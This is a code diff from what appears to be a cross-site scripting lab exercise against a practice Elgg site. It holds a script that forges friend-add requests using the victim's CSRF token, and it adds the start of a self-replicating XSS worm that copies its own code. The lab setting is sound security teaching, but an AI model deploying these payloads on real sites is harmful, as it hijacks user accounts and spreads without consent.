@@ -8,7 +8,7 @@
     var url1 = "http://www.xsslabelgg.com/action/friends/add?friend=";
     var userid = elgg.page_owner.guid;
     var sendurl = url1 + userid + ts + token + ts + token; //FILL IN
-
+  
     // http://www.xsslabelgg.com/action/friends/add?friend=47
     //&__elgg_ts=1624213273&__elgg_token=3qiQClD2nrEaJRzoSOYKbg&__elgg_ts=1624213273
     //&__elgg_token=3qiQClD2nrEaJRzoSOYKbg
@@ -25,3 +25,11 @@
 	
 	}
 </script>
+
+<script id=worm>
+	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+	var jsCode = document.getElementById("worm").innerHTML;
+	var tailTag = "</" + "script > ";
+var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+alert(jsCode);
+</script >
